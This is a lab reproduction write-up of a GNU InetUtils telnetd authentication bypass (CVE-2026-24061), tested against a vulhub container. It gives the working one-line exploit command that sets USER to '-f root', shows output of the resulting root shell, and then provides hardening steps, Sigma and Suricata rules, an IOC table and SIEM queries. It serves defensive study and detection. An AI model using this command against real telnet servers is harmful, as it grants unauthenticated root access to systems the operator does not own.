# CVE-2026-24061 — GNU InetUtils telnetd Argument Injection Authentication Bypass

> Lab Reproduction | vulhub/inetutils:2.5 | 2026-05-24

**Outcome**: Unauthenticated root shell via USER env variable injection.

---

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE | CVE-2026-24061 |
| Affected | GNU InetUtils 1.9.3 – 2.7 |
| CVSS | 9.8 (Critical) |
| Prerequisites | telnetd port reachable (default 23/tcp) |
| Type | CWE-88: Argument Injection |
| Patched | 2.8+ |

**Root cause**: telnetd passes the `USER` environment variable directly to `login(1)` without sanitization. An attacker sets `USER=-f root`, which telnetd passes as `/bin/login -f root` — the `-f` flag tells login to skip authentication.

## 2. Reproduction Steps

### 2.1 Start target

```bash
cd vulhub/inetutils/CVE-2026-24061 && docker compose up -d
# telnetd listening on 0.0.0.0:2323
```

### 2.2 Exploit

**Linux client**:
```bash
USER="-f root" telnet -a 127.0.0.1 2323
```

**macOS client** (no `-a` needed):
```bash
USER="-f root" telnet 127.0.0.1 2323
```

Immediate root shell upon connection — no login prompt, no password.

### 2.3 How it works

1. `telnet -a` enables auto-login mode — the client sends the local `USER` env variable via the telnet NEW-ENVIRON option to telnetd
2. telnetd receives `USER=-f root` with zero sanitization
3. telnetd executes `/bin/login -f root`
4. login's `-f` flag skips authentication entirely → root shell

### 2.4 Evidence

```
$ USER="-f root" telnet -a 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Linux fca79079f43e ... x86_64
root@fca79079f43e:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

| # | Measure | Priority |
|---|---------|----------|
| 1 | Upgrade GNU InetUtils to 2.8+ | **Critical** |
| 2 | Disable telnetd entirely; migrate to SSH | High |
| 3 | IP-allowlist telnet service in xinetd/inetd config (trusted subnet only) | High |
| 4 | Network segmentation: isolate telnet behind jump hosts | Medium |
| 5 | Deploy fail2ban for telnet connection rate-limiting | Low |
| 6 | Block 23/tcp at the network perimeter (telnet is cleartext; never expose it) | Medium |
| 7 | Replace with Kerberized telnet or full SSH migration | Medium |

### 3.2 Detection (Narrative)

- **Suricata/Snort**: Detect NEW-ENVIRON telnet negotiation containing `-f` prefixed USER values
- **Falco**: Monitor telnetd child `login -f` process creation
- **Host logs**: Audit `/var/log/auth.log` for `login -f` successful authentication records
- **Network analysis**: Search cleartext telnet traffic for `USER -f` patterns

### 3.3 Threat Hunting (Narrative)

- **Auth logs**: Check `auth.log` for `login -f` successes — the `-f` flag has no legitimate use in normal operations
- **Process tree**: Find (x)inetd → telnetd → login process chains with `-f` argument
- **Network**: Audit all inbound telnet connections (port 23/2323); any source IP outside the allowlist is suspicious
- **Login timing**: telnet logins are rare in modern environments; every successful login warrants investigation

### 3.4 SOC Artifacts

#### Sigma Rule

```yaml
title: CVE-2026-24061 Telnet USER Argument Injection Auth Bypass
id: 8a3d7f12-6b4c-4e1f-9c20-d5a8b3f1e67c
status: experimental
logsource:
  product: linux
  service: auth
detection:
  selection:
    process.commandline|contains|all: ['login','-f']
    process.parent.name: 'telnetd'
  condition: selection
tags: [attack.t1190, attack.initial_access, attack.t1078.001, cve.2026.24061]
level: critical
```

#### Suricata Rule

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (
    msg: "CVE-2026-24061 Telnet USER Argument Injection Auth Bypass";
    flow: to_server, established;
    content: "|ff fa 27 00 00|";
    content: "USER"; nocase;
    content: "-f"; nocase; within: 10;
    reference: cve,2026.24061;
    reference: url,openwall.com/lists/oss-security/2026/01/20/2;
    classtype: attempted-admin;
    sid: 2026024061; rev: 1;
)
```

#### IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| String | `USER=-f root` | High | Attack env variable |
| String | `USER=-froot` | Medium | Space-less variant |
| String | `USER=-f <any_user>` | Medium | Generic pattern |
| Telnet Option | `IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f..."` | High | Protocol-level signature |
| Log Entry | `login -f root` (parent: telnetd) | High | auth.log evidence |

#### SIEM Hunting Queries

**Splunk SPL**:
```spl
index=linux sourcetype=auth
| search "login" AND "-f"
| where match(process, "telnetd")
| table _time host user process
```

**Microsoft Sentinel KQL**:
```kql
Syslog
| where Facility == "auth"
    and SyslogMessage contains "login"
    and SyslogMessage contains "-f"
| project TimeGenerated, HostName, SyslogMessage
```

## 4. References

- [Openwall oss-security — CVE-2026-24061](https://www.openwall.com/lists/oss-security/2026/01/20/2)
- [NVD — CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
- [vulhub/inetutils/CVE-2026-24061](https://github.com/vulhub/vulhub/tree/master/inetutils/CVE-2026-24061)
